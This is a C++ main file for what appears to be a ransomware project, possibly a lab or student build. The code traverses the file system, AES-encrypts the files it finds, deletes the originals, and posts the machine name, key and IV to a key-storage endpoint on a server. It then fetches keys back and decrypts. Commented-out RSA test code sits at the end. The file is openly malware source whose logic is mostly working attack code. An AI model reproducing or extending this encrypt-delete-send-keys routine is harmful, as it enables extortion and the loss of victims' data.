#include "cryptFile.h"
#include "traversal.h"
#include "post.h"
#include "pcID.h"
#include <cstdio>

using namespace std;

int main(int argc, char* argv[])
{
    string host = "127.0.0.1";   
    string port = "80";
    string reponse_data;

    // encrypt files
	vector<string> en_filePaths;
    Traversal(en_filePaths,true);
    crypt_data* aesKey = generatekey();
    cout<<"Start encrpt a file...\n";
    for (int i=0; i<en_filePaths.size(); i++){
        cout<<"The file path is : "<<en_filePaths[i]<<endl;
        encrypt(aesKey, en_filePaths[i]);
        cout<< "Successfully encrypt, next remove...\n";
        if (remove(en_filePaths[i])==1) cout<< "Successfully remove\n";
    }
	cout<<"Finish all encrypt...\n";

    string pcname = getMachineName();
    cout<<"pcname is: "<<pcname<<endl;
    cout<<"hexkey is: "<<aesKey->hexKey<<endl;
    cout<<"hexiv is: "<<aesKey->hexIV<<endl;

    // post the pcname and key with iv to the server
    string page = "/project/public/index.php/index/index/storeKeys";
    string data = "pcname="+pcname+"&aeskey="+aesKey->hexKey+"&aesiv="+aesKey->hexIV; // +"&payed=false";

    int ret = post(host, port, page, data, reponse_data);
    if (ret != 0)
        cout << "error_code:" << ret << endl;

    cout << reponse_data << endl;

    string page2 = "/project/public/index.php/index/index/releaseKeys";
    string data2 = "id=31";
    int ret2 = post(host, port, page2, data2, reponse_data);
    if (ret2 != 0)
        cout << "error_code:" << ret2 << endl;

    cout << reponse_data << endl;

	// decrypt files
    crypt_data* dedata = new crypt_data;
    dedata->hexKey=aesKey->hexKey;
    dedata->hexIV=aesKey->hexIV;
	vector<string> de_filePaths;
    Traversal(de_filePaths,false);
    hex_to_byte_key(dedata);
	cout<<"Start decrpt a file...\n";
    for (int i=0; i<de_filePaths.size(); i++){
        cout<<"The file path is : "<<de_filePaths[i]<<endl;
        decrypt(dedata, de_filePaths[i]);
        cout<< "Successfully decrypt, next remove...\n";
        if (remove(de_filePaths[i])==1) cout<<"Successfully remove\n";
    }
    cout<<"Finish all decrypt...\n";

    // // rsa .....
    // string message = "I love CoralineH";
    // cout << "message = "<<message<<"\nlength = "<< message.size()<< endl;
    // // Generate keys
    // AutoSeededRandomPool rng;
    // InvertibleRSAFunction params;
    // params.GenerateRandomWithKeySize(rng, 1024);

    // RSA::PrivateKey privateKey(params);
    // RSA::PublicKey publicKey(params);

    // string plain="RSA Encryption", cipher, recovered;
    // ////////////////////////////////////////////////
    // // Encryption
    // RSAES_OAEP_SHA_Encryptor e(publicKey);

    // StringSource ss1(message, true,
    //     new PK_EncryptorFilter(rng, e,
    //         new StringSink(cipher)
    // ) // PK_EncryptorFilter
    // ); // StringSource
    // cout<<cipher.size()<<endl;
    // ////////////////////////////////////////////////
    // // Decryption
    // RSAES_OAEP_SHA_Decryptor d(privateKey);

    // StringSource ss2(cipher, true,
    //     new PK_DecryptorFilter(rng, d,
    //         new StringSink(recovered)
    // ) // PK_DecryptorFilter
    // ); // StringSource

    // cout << "Recovered plain text" << endl;
    // cout << recovered<<endl;

    return 0;
}